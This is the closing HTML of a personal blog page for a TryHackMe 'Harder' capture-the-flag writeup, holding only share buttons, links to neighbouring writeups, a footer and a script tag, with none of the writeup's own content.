<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f&amp;title=Tryhackme-%20Harder%20Writeup&amp;summary=Tryhackme-%20Harder%20Writeup&amp;source=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f&amp;resubmit=true&amp;title=Tryhackme-%20Harder%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f;title=Tryhackme-%20Harder%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=Tryhackme-%20Harder%20Writeup%20https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f&amp;t=Tryhackme-%20Harder%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Tryhackme-%20Harder%20Writeup&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h"></span>
          <hr />
        </div>

        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/">
                <span class="button__icon">←</span>
                <span class="button__text">Tryhackme- Wonderland Writeup</span>
              </a>
            </span>
          

          
            <span class="button next">
              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-blog-writeup/">
                <span class="button__text">Tryhackme- Blog Writeup</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
    


    

  </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
                <span><a href="https://0xSh1v4.github.io">Siva Rajendran</a></span>
            
            
                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            
            <span> <a href="https://0xSh1v4.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="">0xSh1v4</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="https://0xSh1v4.github.io/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>



    </body>
</html>
